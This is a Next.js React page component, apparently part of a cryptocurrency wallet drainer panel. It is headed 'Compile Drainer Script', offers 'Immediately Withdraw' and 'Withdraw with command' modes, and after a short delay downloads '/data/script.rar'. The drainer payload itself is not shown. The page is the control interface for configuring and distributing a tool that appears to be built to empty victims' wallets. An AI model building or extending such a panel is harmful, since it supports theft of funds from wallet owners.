"use client";
import dynamic from "next/dynamic";
import React from "react";
import { useState } from "react";
import DefaultLayout from "@/components/Layouts/DefaultLayout";
import styles from './styles.module.css';

const MapOne = dynamic(() => import("@/components/Maps/MapOne"), {
  ssr: false,
});

const ECommerce: React.FC = () => {
  const [selected, setSelected] = useState<boolean>(false);
  const [isDownloading, setIsDownloading] = useState(false);

  const handleDownload = () => {
    setIsDownloading(true);
    setTimeout(() => {
      // Trigger the download after 5 seconds
      window.location.href = '/data/script.rar';
      setIsDownloading(false); // Reset the state if needed
    }, 5000); // 5000 milliseconds = 5 seconds
  };
  return (
    <DefaultLayout>
        <center>
            <div className="w-[80%] h-150 bg-slate-900 rounded-md shadow-4 md:p-17 lg:p-17 p-8 font-medium text-[20px]">
                <p>
                    Compile Drainer Script
                </p>
                <select className="mt-15 md:w-[90%] lg:w-[90%] w-full md:p-3 lg:p-3 p-1 bg-black" 
                    onChange={(e) => {
                        e.preventDefault();
                        setSelected(Number(e.target.value) !== Number(0));
                    }}
                >
                    <option value={0}>
                        Select
                    </option>
                    <option value={1}>
                        Immediately Withdraw
                    </option>
                    <option value={2}>
                        Withdraw with command
                    </option>
                </select>
                <div>
                {isDownloading && (
                    <div className={styles.spinner}></div> // Show spinner while downloading
                )}
                </div>
                {
                    selected === true?
                    <button
                        onClick={handleDownload}
                        className="bg-black p-3 rounded-sm mt-20"
                        disabled={isDownloading} // Optional: disable the button while downloading
                    >
                        {isDownloading ? 'Downloading...' : 'Download'}
                    </button>
                    : 
                    <button className="bg-black p-3 rounded-sm mt-20">
                        Download
                    </button>
                }
                  
            </div>
        </center>
    </DefaultLayout>
  );
};

export default ECommerce;
